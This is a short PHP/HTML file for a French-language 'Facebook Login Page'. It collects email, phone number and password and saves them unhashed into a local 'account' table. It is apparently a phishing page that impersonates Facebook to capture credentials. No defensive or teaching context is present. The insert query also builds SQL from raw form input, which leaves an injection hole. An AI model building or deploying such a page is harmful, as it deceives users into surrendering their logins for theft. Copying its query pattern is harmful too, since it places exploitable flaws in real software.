<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Facebook Login Page</title>
 <link rel="stylesheet" href="style.css">
 <link rel="icon" href="fb_icon_325x325.png">
 <script src = "script.js"></script>
</head>
<body>
 <div class="container">
  <form class="login-form" method = "post">
   <h1>Facebook</h1>
   <input type="email" name = "email" placeholder="Email">
   <input type="number" name = "number" placeholder="Numéro" class = "n">
   <input type="password" name = "password" placeholder="Mot de passe">
   <button type="submit" name = "login"><a href="snippets (1).php">connexion</a></button>
   <p><a href="#">Mot de passe oublié?</a></p>
   <hr>
   <p>Vous n'avez pas de compte? <a href="snippets (1).php">s'inscrire</a></p>
  </form>
  <?php
  REQUIRE('db.php');//database
  if(isset($_POST['login'])) {
    $number = $_POST['number'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $query = mysqli_query($con,"INSERT INTO `account`(`number`, `email`, `password`) VALUES ('$number',' $email','$password') ");
    //$row = mysqli_result($query);
   
  }
  ?>
 </div>
</body>
</html>